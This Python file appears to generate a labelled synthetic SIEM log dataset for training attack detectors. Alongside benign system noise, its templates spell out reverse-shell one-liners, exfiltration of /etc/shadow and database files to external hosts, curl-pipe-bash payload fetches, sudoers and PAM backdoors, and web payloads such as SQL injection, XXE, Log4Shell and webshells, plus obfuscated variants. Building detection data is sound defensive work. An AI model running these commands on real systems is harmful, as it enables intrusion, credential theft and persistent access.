# File: src/incident_dataset.py
# Description: Production-Scale 500,000+ Multi-Source SIEM Log Generator
# Features: Safe Baseline Noise + 6 Attack Categories + Advanced Obfuscation Engine

import random
import string
import pandas as pd
from typing import Tuple, List
from config.incident_config import config


class SIEMIncidentDatasetGenerator:
    """
    500.000+ Log Kapasiteli Gerçekçi SIEM Veri Seti Üreteci.
    Hem meşru sistem gürültüsünü (False Positive engellemek için) 
    hem de 6 farklı gelişmiş saldırı kategorisini simüle eder.
    """
    def __init__(self):
        # Genişletilmiş Parametre Havuzları
        self.ips_internal = [f"10.{a}.{b}.{c}" for a in range(10, 20) for b in range(1, 5) for c in range(1, 255)]
        self.ips_external = [f"194.26.29.{i}" for i in range(1, 255)] + [f"185.220.101.{i}" for i in range(1, 255)] + [f"45.142.214.{i}" for i in range(1, 255)]
        
        self.hosts = [f"srv-{env}-{role}{i:02d}" for env in ["prod", "stage", "dev"] 
                      for role in ["web", "db", "app", "k8s", "auth", "proxy", "sec"] 
                      for i in range(1, 10)]
        
        self.users = ["www-data", "postgres", "ansible", "sysadmin", "devops", "jenkins", 
                      "nobody", "root", "oracle", "nginx", "redis", "mysql", "appadmin", "developer"]
        
        self.paths = ["/tmp", "/var/tmp", "/dev/shm", "/run/user/1000", "/etc/pam.d", 
                      "/opt/app", "/home/devuser", "/var/www/html", "/etc/nginx/conf.d", "/usr/local/bin"]
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "python-requests/2.31.0", "curl/7.88.1", "Go-http-client/1.1",
            "Nikto/2.1.6", "sqlmap/1.7.2#stable", "Nmap Scripting Engine", "Wget/1.21.3"
        ]

    def _random_str(self, length=8):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    # =========================================================================
    # 0. SAFE_NOISE (Meşru Trafik - SIEM'in %60'ını Oluşturur)
    # =========================================================================
    def _generate_safe_noise_templates(self) -> List[str]:
        return [
            "systemd[1]: Starting Daily apt download activities...",
            "systemd[1]: Started Periodic Command Scheduler.",
            "ufw[1100]: [UFW ALLOW] IN=eth0 OUT= SRC={ip_int} DST={ip_int} PROTO=TCP SPT={port} DPT=443",
            "CRON[{pid}]: ({user}) CMD (cd / && run-parts --report /etc/cron.hourly)",
            "dpkg[{pid}]: status installed logrotate:amd64 3.19.0-1",
            "sshd[{pid}]: Accepted publickey for {user} from {ip_int} port {port} ssh2",
            "systemd-resolved[500]: Clock synchronized to server {ip_ext}.",
            "nginx[{pid}]: {ip_int} - - [13/Aug/2026:12:00:00 +0300] \"GET /static/css/main.css HTTP/1.1\" 200 4520 \"-\" \"{agent}\"",
            "nginx[{pid}]: {ip_int} - - [13/Aug/2026:12:00:00 +0300] \"GET /api/v1/healthcheck HTTP/1.1\" 200 45 \"-\" \"{agent}\"",
            "apache2[{pid}]: {ip_int} - - [13/Aug/2026:12:00:00 +0300] \"POST /user/login HTTP/1.1\" 200 890 \"-\" \"{agent}\"",
            "postgres[{pid}]: [1-1] LOG: statement: SELECT count(*) FROM transaction_ledger WHERE status = 'COMPLETED';",
            "redis[{pid}]: {ip_int}:42100> GET session:oauth2:token:{pid}",
            "dockerd[{pid}]: msg=\"health check completed\" container={rand_id} status=healthy",
            "sudo: {user} : TTY=pts/{tty} ; PWD={path} ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx",
            "sudo: {user} : TTY=pts/{tty} ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/tail -n 100 syslog"
        ]

    # =========================================================================
    # 1. SYSTEM_INTEGRITY (PrivEsc, Sudo Abuse, SUID, PAM, Chpasswd, Persistence)
    # =========================================================================
    def _generate_system_integrity_templates(self) -> List[str]:
        return [
            "sudo: {user} : TTY=pts/{tty} ; PWD={path} ; USER=root ; COMMAND=/usr/bin/vim -c ':!/bin/sh'",
            "sudo: {user} : TTY=pts/{tty} ; PWD={path} ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh -i \\; -quit",
            "sudo: {user} : TTY=pts/{tty} ; PWD={path} ; USER=root ; COMMAND=/usr/bin/awk 'BEGIN {{system(\"/bin/sh\")}}'",
            "sudo: {user} : TTY=pts/{tty} ; PWD={path} ; USER=root ; COMMAND=/usr/bin/python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            "sudo: {user} : TTY=pts/{tty} ; PWD={path} ; USER=root ; COMMAND=/usr/bin/perl -e 'exec \"/bin/sh\";'",
            "sudo: {user} : TTY=pts/{tty} ; PWD={path} ; USER=root ; COMMAND=/usr/bin/env /bin/sh",
            "sudo: {user} : TTY=pts/{tty} ; PWD={path} ; USER=root ; COMMAND=/usr/bin/capsh --gid=0 --uid=0 --",
            "sudo: {user} : TTY=pts/{tty} ; PWD={path} ; USER=root ; COMMAND=/usr/bin/flock -u / /bin/sh",
            "bash Executed: echo 'root:P@ssw0rd123!' | /usr/sbin/chpasswd",
            "bash Executed: /usr/bin/chmod 4755 /bin/dash",
            "bash Executed: /bin/cp /bin/sh {path}/.pwned && /bin/chmod u+s {path}/.pwned",
            "bash Executed: /usr/bin/echo 'auth optional pam_exec.so expose_authtok {path}/steal.sh' >> /etc/pam.d/common-auth",
            "bash Executed: /usr/bin/echo 'backdoor_usr ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
            "bash Executed: usermod -aG sudo,root backdoor_usr",
            "bash Executed: setcap cap_setuid+ep /usr/bin/python3",
            "bash Executed: /usr/bin/find / -perm -4000 -type f 2>/dev/null > {path}/suid_scan.txt"
        ]

    # =========================================================================
    # 2. NETWORK_C2 (Reverse Shells, Socat, Ncat, Dev Tcp, Exfiltration)
    # =========================================================================
    def _generate_network_c2_templates(self) -> List[str]:
        return [
            "bash Executed: /bin/nc -e /bin/bash {ip_ext} {port}",
            "bash Executed: /bin/sh -i >& /dev/tcp/{ip_ext}/{port} 0>&1",
            "bash Executed: python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip_ext}\",{port}));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'",
            "bash Executed: /usr/bin/perl -e 'use IO::Socket;$c=new IO::Socket::INET(PeerAddr,\"{ip_ext}:{port}\");STDIN->fdopen($c,r); /bin/sh -i'",
            "bash Executed: php -r '$s=fsockopen(\"{ip_ext}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "bash Executed: ruby -rsocket -e'f=TCPSocket.open(\"{ip_ext}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "bash Executed: lua -e 'local host, port = \"{ip_ext}\", {port}; local socket = require(\"socket\"); local tcp = socket.tcp(); tcp:connect(host, port); os.execute(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "bash Executed: /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip_ext}:{port}",
            "bash Executed: ncat {ip_ext} {port} -e /bin/bash",
            "bash Executed: /bin/dash -c 'exec 5<>/dev/tcp/{ip_ext}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'",
            "bash Executed: node -e 'require(\"child_process\").exec(\"bash -i >& /dev/tcp/{ip_ext}/{port} 0>&1\")'",
            "bash Executed: /usr/bin/curl -F 'file=@/etc/passwd' http://{ip_ext}/upload",
            "bash Executed: /usr/bin/rsync -avz /etc/shadow attacker@{ip_ext}:/tmp/",
            "bash Executed: /usr/bin/scp -P 2222 /var/lib/mysql/ibdata1 attacker@{ip_ext}:/dump/",
            "bash Executed: /usr/bin/aws s3 sync /var/www/html s3://attacker-bucket/exfil/",
            "bash Executed: /usr/bin/curl -s http://{ip_ext}/setup.sh | /bin/bash",
            "bash Executed: /usr/bin/wget -qO- http://{ip_ext}/bot.sh | /bin/sh"
        ]

    # =========================================================================
    # 3. PROCESS_INJECTION (RAM-Only, Memfd, Ptrace, Kernel Rootkits, BPF)
    # =========================================================================
    def _generate_process_injection_templates(self) -> List[str]:
        return [
            "auditd[{pid}]: type=SYSCALL audit(1691848655.456:92): arch=c000003e syscall=322 success=yes exit=3 items=0 ppid=4100 pid=4102 exe=\"/memfd:malicious (deleted)\" key=\"memfd_exec\"",
            "auditd[{pid}]: type=EXECVE audit(1691848350.123:88): argc=3 a0=\"/usr/bin/gdb\" a1=\"-configuration\" a2=\"python import os;os.system('/bin/sh')\"",
            "bash Executed: python3 -c 'import ctypes; libc = ctypes.CDLL(None); libc.syscall(319, \"anon\", 1)'",
            "bash Executed: perl -e 'use POSIX; sysopen(FD, \"/proc/self/mem\", O_RDWR); sysseek(FD, 0x400000, 0); syswrite(FD, \"\\x90\\x90\\x90\", 3);'",
            "bash Executed: {path}/.. /bin/sh",
            "bash Executed: mount -o bind {path}/.empty /var/log/journal",
            "bash Executed: kill -9 $(pgrep auditd)",
            "bash Executed: echo 1 > /proc/sys/kernel/nmi_watchdog",
            "bash Executed: gdb -p 1 -ex 'call (void)system(\"curl http://{ip_ext}/s | sh\")' -ex 'detach' -ex 'quit'",
            "bash Executed: bpf -e 'prog_load(BPF_PROG_TYPE_KPROBE, ...)' {path}/hide_pid.o",
            "bash Executed: python3 -c 'import ctypes; ctypes.CDLL(\"libc.so.6\").process_vm_writev(1, ...)'",
            "bash Executed: /proc/self/fd/3 {ip_ext} {port}",
            "bash Executed: unshare -m -u -i -n -p -f --mount-proc /bin/bash",
            "bash Executed: ptrace -p 1 -e 'write_mem(0x7fff, \"\\x90\\x90\")'",
            "bash Executed: insmod {path}/unknown_rootkit.ko"
        ]

    # =========================================================================
    # 4. APPLICATION_EXPLOIT (SQLi, XXE, LFI, Log4Shell, WebShells, Deserialization)
    # =========================================================================
    def _generate_application_exploit_templates(self) -> List[str]:
        return [
            "nginx[{pid}]: {ip_ext} - - [13/Aug/2026:12:00:00 +0300] \"GET /page.php?id=1'%20UNION%20SELECT%20null,table_name%20FROM%20information_schema.tables--%20 HTTP/1.1\" 200 1500 \"-\" \"{agent}\"",
            "apache2[{pid}]: {ip_ext} - - [13/Aug/2026:12:00:00 +0300] \"GET /../../../../etc/passwd HTTP/1.1\" 403 280 \"-\" \"{agent}\"",
            "nginx[{pid}]: {ip_ext} - - [13/Aug/2026:12:00:00 +0300] \"POST /uploads/shell.php?cmd=id HTTP/1.1\" 200 120 \"-\" \"{agent}\"",
            "apache2[{pid}]: {ip_ext} - - [13/Aug/2026:12:00:00 +0300] \"GET /search.php?q=<script>document.location='http://{ip_ext}/c='*document.cookie</script> HTTP/1.1\" 200 450",
            "nginx[{pid}]: {ip_ext} - - [13/Aug/2026:12:00:00 +0300] \"GET /view.php?file=php://filter/convert.base64-encode/resource=config.php HTTP/1.1\" 200 2400",
            "apache2[{pid}]: {ip_ext} - - [13/Aug/2026:12:00:00 +0300] \"POST /api/xml HTTP/1.1\" 200 310 \"<!DOCTYPE test [<!ENTITY xxe SYSTEM \\\"file:///etc/shadow\\\">]>\"",
            "nginx[{pid}]: {ip_ext} - - [13/Aug/2026:12:00:00 +0300] \"GET /ping.php?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1\" 200 1800",
            "apache2[{pid}]: {ip_ext} - - [13/Aug/2026:12:00:00 +0300] \"PUT /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 200 50 \"<?=system($_GET['c']);?>\"",
            "postgres[{pid}]: [3-1] LOG: statement: COPY (SELECT '') TO PROGRAM 'curl -s http://{ip_ext}/p.sh | bash';",
            "redis[{pid}]: {ip_ext}:54321> CONFIG SET dir /var/spool/cron/crontabs",
            "redis[{pid}]: {ip_ext}:54321> SET payload \"\\n\\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{ip_ext}/4444 0>&1'\\n\\n\"",
            "apache2[{pid}]: {ip_ext} - - [13/Aug/2026:12:00:00 +0300] \"GET /login HTTP/1.1\" 200 3200 \"${{jndi:ldap://{ip_ext}:1389/Exploit}}\"",
            "redis[{pid}]: {ip_ext}:54321> EVAL \"return os.execute('/bin/sh -i >& /dev/tcp/{ip_ext}/4444 0>&1')\" 0"
        ]

    # =========================================================================
    # 5. OBFUSCATION_EVASION (Wildcards, Quotes, Base64 Pipe, IFS, Rev)
    # =========================================================================
    def _generate_obfuscation_templates(self) -> List[str]:
        return [
            "bash Executed: /b'i'n/b'a's'h -c 'cat /etc/shadow'",
            "bash Executed: /???/p*th*n3 -c 'import os; os.system(\"nc -e /bin/sh {ip_ext} {port}\")'",
            "bash Executed: IFS=,;cmd=cat,/etc/shadow;$cmd",
            "bash Executed: base64 -d <<< \"Y2F0IC9ldGMvc2hhZG93IHwgbmMgSVA=\" | bash",
            "bash Executed: echo -e \"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" | bash",
            "bash Executed: export HISTFILE=/dev/null && unset HISTFILE && rm -rf ~/.bash_history",
            "bash Executed: /usr/bin/env -i PATH=/bin:/usr/bin /bin/sh -i",
            "bash Executed: echo \"import socket,subprocess,os\" | python3 -",
            "bash Executed: bash -c '${{PATH:0:1}}b${{PATH:13:1}}n${{PATH:0:1}}b${{PATH:8:1}}sh -i >& /dev/tcp/{ip_ext}/{port} 0>&1'",
            "bash Executed: rev <<< \"{port} {ip_ext} hs/nib/ e- cn\" | bash"
        ]

    def build_dataset(self, total_logs: int = 500000) -> Tuple[List[str], List[str]]:
        """
        500.000 Logluk Devasa Veri Setini Üretir.
        Gürültü Oranı: %50 SAFE_NOISE, %50 Saldırı Kategorileri.
        """
        print(f"🚀 [500K DATASET ENGINE] Total {total_logs:,} Adet SIEM Logu Sentezleniyor...")

        category_generators = {
            "SAFE_NOISE": (self._generate_safe_noise_templates, int(total_logs * 0.50)),
            "SYSTEM_INTEGRITY": (self._generate_system_integrity_templates, int(total_logs * 0.10)),
            "NETWORK_C2": (self._generate_network_c2_templates, int(total_logs * 0.10)),
            "PROCESS_INJECTION": (self._generate_process_injection_templates, int(total_logs * 0.10)),
            "APPLICATION_EXPLOIT": (self._generate_application_exploit_templates, int(total_logs * 0.10)),
            "OBFUSCATION_EVASION": (self._generate_obfuscation_templates, int(total_logs * 0.10))
        }

        raw_logs, labels = [], []

        for cat_name, (gen_func, count) in category_generators.items():
            templates = gen_func()
            print(f"   └─ [{cat_name:<20}] {count:,} Örnek Üretiliyor...")
            for _ in range(count):
                tmpl = random.choice(templates)
                formatted = tmpl.format(
                    user=random.choice(self.users),
                    tty=random.randint(0, 9),
                    path=random.choice(self.paths),
                    pid=random.randint(100, 65000),
                    port=random.randint(1024, 65535),
                    ip_int=random.choice(self.ips_internal),
                    ip_ext=random.choice(self.ips_external),
                    agent=random.choice(self.user_agents),
                    rand_id=self._random_str(12)
                )
                syslog_line = f"Aug 13 {random.randint(10,23)}:{random.randint(10,59)}:{random.randint(10,59)} {random.choice(self.hosts)} {formatted}"
                raw_logs.append(syslog_line)
                labels.append(cat_name)

        # Veriyi Karıştır (Shuffle)
        combined = list(zip(raw_logs, labels))
        random.shuffle(combined)
        raw_logs, labels = zip(*combined)

        print(f"✅ {len(raw_logs):,} Logluk Devasa Veri Seti Başarıyla Oluşturuldu!")
        return list(raw_logs), list(labels)


# Doğrulama Testi
if __name__ == "__main__":
    generator = SIEMIncidentDatasetGenerator()
    logs, labels = generator.build_dataset(total_logs=10000)
    print(f"\n--- DATASET VERIFICATION ---")
    print(f"Sample Log: {logs[0]}")
    print(f"Sample Label: {labels[0]}")